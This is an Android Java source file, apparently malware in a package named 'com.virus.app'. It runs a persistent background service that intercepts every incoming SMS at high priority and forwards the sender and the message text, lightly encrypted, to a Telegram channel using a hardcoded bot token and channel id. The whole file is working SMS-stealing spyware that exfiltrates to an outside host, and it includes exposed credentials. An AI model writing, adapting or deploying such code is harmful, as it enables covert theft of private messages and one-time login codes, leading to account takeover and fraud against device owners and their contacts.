package com.virus.app;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.SmsMessage;

public class SmsReceiverService extends Service {

    private static final String BOT_TOKEN = "9141713476:AAGVEWxl07Nyb8y2BtXfI9eLZVaHqVeDijA";
    private static final String CHANNEL_ID = "-1004467128952";
    private static final String ENCRYPTION_KEY = "SecretKey2024apkbot!";

    private BroadcastReceiver smsReceiver;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        registerSmsReceiver();
        return START_STICKY;
    }

    private void registerSmsReceiver() {
        smsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                    Object[] pdus = (Object[]) intent.getExtras().get("pdus");
                    String format = intent.getStringExtra("format");

                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                            String sender = sms.getOriginatingAddress();
                            String body = sms.getMessageBody();

                            processSms(sender, body);
                        }
                    }
                }
            }
        };

        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
        registerReceiver(smsReceiver, filter);
    }

    private void processSms(final String sender, final String body) {
        new Thread(() -> {
            try {
                CryptoHelper crypto = new CryptoHelper(ENCRYPTION_KEY);
                String encryptedSender = crypto.encrypt(sender != null ? sender : "неизвестен");
                String encryptedBody = crypto.encrypt(body != null ? body : "");

                TelegramSender tg = new TelegramSender(BOT_TOKEN, CHANNEL_ID);
                tg.sendMessage(
                    "📨 *Входящее SMS*\n" +
                    "📞 От: `" + encryptedSender + "`\n" +
                    "💬 Текст: `" + encryptedBody + "`"
                );
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (smsReceiver != null) {
            unregisterReceiver(smsReceiver);
        }
    }
}
